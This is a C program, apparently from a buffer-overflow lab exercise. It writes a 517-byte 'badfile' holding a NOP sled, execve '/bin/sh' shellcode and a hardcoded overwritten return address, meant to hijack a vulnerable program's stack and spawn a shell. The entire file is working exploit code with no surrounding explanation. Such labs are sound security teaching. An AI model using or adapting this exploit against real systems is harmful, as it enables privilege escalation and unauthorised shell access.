
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define DEFAULT_OFFSET	104
#define BUFFER_SIZE	517


char shellcode[] =
	//\x48\x31\xc0\x50\x48\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62
	//\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x3b\xcd\x80
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; //shellcode that should execute when compiled and ran

		     
void write_badfile(char *buffer){
	FILE *badfile = fopen("badfile", "w");
	fwrite(buffer, 1,BUFFER_SIZE,badfile);
	fclose(badfile);
	printf("Payloas written to badfile.\n");
}	      
int main(){
	char buffer[BUFFER_SIZE];
	int shell_start;//location of shellcode
	int offset=DEFAULT_OFFSET;
	long *addr_ptr; //current stack pointer into/
	int i;
	
	printf("Offset from (ESP) : 0x%x\n", offset);
	
	//fills the buffer with NOPs to reach the top of the buffer
	memset(buffer, 0x90, BUFFER_SIZE);
	printf("buff size %d\n",BUFFER_SIZE);//test code

	//places shellcode towards end of the buffer
	shell_start = BUFFER_SIZE - sizeof(shellcode)-1;
	memcpy(buffer + shell_start,shellcode,sizeof(shellcode));
	printf("buff size %d\n",BUFFER_SIZE);//test code
		
	//fills buffer with desired ret address
	//points to buffer array
	addr_ptr = (long*)(buffer + 112);
	*addr_ptr = 0xffffffffeca8; //xfffffffecb0
	
	//Opens the badfile and writes to it
	write_badfile(buffer);

	return 0;
}
